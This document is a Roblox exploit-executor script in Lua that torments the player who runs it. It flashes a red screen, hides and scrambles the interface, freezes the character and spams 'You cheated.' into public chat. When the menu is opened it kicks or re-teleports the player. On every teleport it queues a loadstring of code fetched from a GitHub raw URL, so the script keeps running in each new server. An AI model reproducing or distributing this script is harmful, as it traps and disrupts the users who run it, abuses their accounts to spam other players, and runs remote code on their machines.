noFunction = function(...) warn(`noFunction { tostring(...) }`) end
qtp = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport) or queueteleport or noFunction

Lighting = game:GetService("Lighting")
ReplicatedStorage = game:GetService("ReplicatedStorage")
TextChatService = game:GetService("TextChatService")
Players = game:GetService("Players")
StarterGui = game:GetService("StarterGui")
GuiService = game:GetService("GuiService")
TeleportService = game:GetService("TeleportService")
CoreGui = game:GetService("CoreGui")

Players.LocalPlayer.OnTeleport:Connect(function(State)
    if qtp and qtp ~= noFunction then
        qtp("loadstring(game:HttpGet('https://raw.githubusercontent.com/buhhhhg/RobloxScriptz/refs/heads/main/scary.lua'))()")
    end
end)

PlaceId, JobId = game.PlaceId, game.JobId

GuiService.MenuOpened:Connect(function()
	if #Players:GetPlayers() <= 1 then
		Players.LocalPlayer:Kick("\nNice try. You cant escape")
		wait()
        if qtp and qtp ~= noFunction then
            qtp("loadstring(game:HttpGet('https://raw.githubusercontent.com/buhhhhg/RobloxScriptz/refs/heads/main/scary.lua'))()")
		end
        TeleportService:Teleport(PlaceId, Players.LocalPlayer)
	else
        if qtp and qtp ~= noFunction then
            qtp("loadstring(game:HttpGet('https://raw.githubusercontent.com/buhhhhg/RobloxScriptz/refs/heads/main/scary.lua'))()")
		end
        TeleportService:TeleportToPlaceInstance(PlaceId, JobId, Players.LocalPlayer)
	end
end)

LocalPlayer = Players.LocalPlayer
isLegacyChat = TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService

Red = Instance.new("ColorCorrectionEffect", Lighting)

coreGuiTypeNames = {
    Enum.CoreGuiType.Backpack,
    Enum.CoreGuiType.PlayerList,
    Enum.CoreGuiType.EmotesMenu
}

for _, enumItem in ipairs(Enum.CoreGuiType:GetEnumItems()) do
    if not string.find(enumItem.Name:lower(), "selfview") then
        table.insert(coreGuiTypeNames, enumItem)
    end
end

function chatMessage(str)
    str = tostring(str)
    if not isLegacyChat then
        TextChatService.TextChannels.RBXGeneral:SendAsync(str)
    else
        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
    end
end

function randstr(length)
    a = ''
    for i = 1, length do
        a = a .. utf8.char(math.random(50,2000))
    end
    return a
end

Red.Name = randstr(10)
Red.Enabled = true
Red.Saturation = -1
Red.Contrast = -2558222
Red.Brightness = -1555
Red.TintColor = Color3.fromRGB(255, 0, 0)

task.spawn(function()
    while task.wait(0.005) do
        for _, guiType in pairs(coreGuiTypeNames) do
            pcall(function() StarterGui:SetCoreGuiEnabled(guiType, false) end)
        end
    end
end)

task.spawn(function()
    while task.wait() do
        Red.Brightness = math.random(-155555, -1555)
    end
end)

task.spawn(function()
    while task.wait() do
        Red.Contrast = math.random(-2558222, 2558222)
    end
end)

task.spawn(function()
    while task.wait() do
        Red.Saturation = math.random(-1, 0)
    end
end)

for i=1,3 do
    chatMessage('You cheated. '..randstr(math.random(10, 20)))
end

task.spawn(function()
    while task.wait(12) do
        for i=1,3 do
            chatMessage('You cheated. '..randstr(math.random(10, 20)))
        end
    end
end)

task.spawn(function()
    while task.wait(0.005) do
        Character = LocalPlayer.Character
        if Character then
            Character.Humanoid.WalkSpeed = 0
        end
    end
end)

task.spawn(function()
    while task.wait(0.005) do
        Character = LocalPlayer.Character
        Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
        if Character and Humanoid then
            if Humanoid.UseJumpPower then
                Humanoid.JumpPower = 0
            else
                Humanoid.JumpHeight = 0
            end
        end
    end
end)

task.spawn(function()
    Character = LocalPlayer.Character
    Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    Character.HumanoidRootPart.CFrame = Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0) 
    workspace.Gravity = 0
    while task.wait(0.005) do
        Character = LocalPlayer.Character
        Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
        if Character and Humanoid then
            Humanoid.PlatformStand = true
        end
    end
end)

Character = LocalPlayer.Character
if Character then
    pcall(function() _G.oldCFrame = Character.HumanoidRootPart.CFrame end)
end

if _G.oldCFrame then
    task.spawn(function()
        while task.wait(0.005) do
            Character = LocalPlayer.Character
            Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
            if Character and Humanoid then
                Character.HumanoidRootPart.CFrame = _G.oldCFrame
            end
        end
    end)
end

task.spawn(function()
    while task.wait(0.005) do
        Character = LocalPlayer.Character
        if Character then
            table.foreach(Character:GetChildren(), function(_, x)
                if x:IsA("BasePart") then
                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                end
            end)
        end
    end
end)

task.spawn(function()
    while task.wait(0.005) do
        Character = LocalPlayer.Character
        if Character then
            table.foreach(Character:GetDescendants(), function(_, x)
                if x:IsA("BodyGyro") or x:IsA("BodyVelocity") then
                    x:Destroy()
                end
            end)
        end
    end
end)

PlayerGui = Players.LocalPlayer.PlayerGui
oo = {true, false}
hui = get_hidden_gui or gethui or function(...) return CoreGui.HiddenUI or nil end
huiP = hui()

properties = {
    Name = randstr(100),
    Text = randstr(100),
    BackgroundColor3 = Color3.new(255, 0, 0),
    BorderColor3 = Color3.new(0, 0, 0),
    TextScaled = oo[math.random(1,#oo)],
}

propertiesCG = {
    Name = randstr(100),
    Text = randstr(100),
    BackgroundColor3 = Color3.new(255, 0, 0),
    BorderColor3 = Color3.new(0, 0, 0),
    Visible = oo[math.random(1,#oo)],
}

task.spawn(function()
    while task.wait(0.005) do
        for _, gui in PlayerGui:GetDescendants() do
            for property, value in properties do
                pcall(function() gui[property] = value end)
                task.wait()
            end
            task.wait()
        end
    end
end)

task.spawn(function()
    while task.wait(0.005) do
        for _, gui in CoreGui:GetDescendants() do
            for property, value in propertiesCG do
                pcall(function() gui[property] = value end)
                task.wait()
            end
            task.wait()
        end
    end
end)

if huiP then
    task.spawn(function()
        while task.wait(0.005) do
            for _, gui in huiP:GetDescendants() do
                if gui.Name ~= "RobloxGui" and not string.find("robloxgui", gui:GetFullName():lower()) then
                    for property, value in propertiesCG do
                        pcall(function() gui[property] = value end)
                        task.wait()
                    end
                    task.wait()
                end
            end
        end
    end)
end
